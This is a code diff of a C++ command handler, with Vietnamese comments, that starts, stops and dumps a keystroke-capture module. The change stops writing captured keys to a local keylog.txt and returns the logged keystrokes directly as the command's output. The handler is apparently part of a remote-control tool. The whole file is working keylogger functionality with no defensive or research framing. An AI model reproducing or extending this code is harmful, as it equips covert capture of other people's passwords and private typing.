@@ -1,29 +1,38 @@
+// src/Commands/KeyCommand.cpp
+
 #include "../../include/Commands/KeyCommand.h"
 #include "../../include/Modules/KeyController.h"
-#include <fstream>
+// Bỏ include <fstream> vì không dùng file nữa
 #include <sstream>
 
 std::string KeyCommand::execute(const std::string& args) {
     if (args == "start") {
         KeyControllerModule::start();
-        return "[Key] capture started";
+        return "SUCCESS: Key capture started."; // Sửa lại thông báo để nhất quán
     }
 
     if (args == "stop") {
         KeyControllerModule::stop();
-        return "[Key] capture stopped";
+        return "SUCCESS: Key capture stopped.";
     }
-    if (args == "dump") {
-        std::string data = KeyControllerModule::getBuffer();
 
-        std::ofstream f("keylog.txt", std::ios::app);
+    if (args == "dump") {
+        std::string keylog_data = KeyControllerModule::getBuffer();
+        
+        // --- LOGIC GHI FILE ĐÃ BỊ LOẠI BỎ ---
+        /* std::ofstream f("keylog.txt", std::ios::app);
         if (f.is_open()) {
             f << data;
             f.close();
         }
-
-        return "[Key] buffer dumped to keylog.txt";
+        */
+        
+        if (!keylog_data.empty()) {
+            return "SUCCESS: Key log content:\n" + keylog_data;
+        } else {
+            return "SUCCESS: Key log buffer is currently empty.";
+        }
     }
 
-    return "[Key] Unknown key command: " + args;
+    return "ERROR: Unknown key command: " + args;
 }
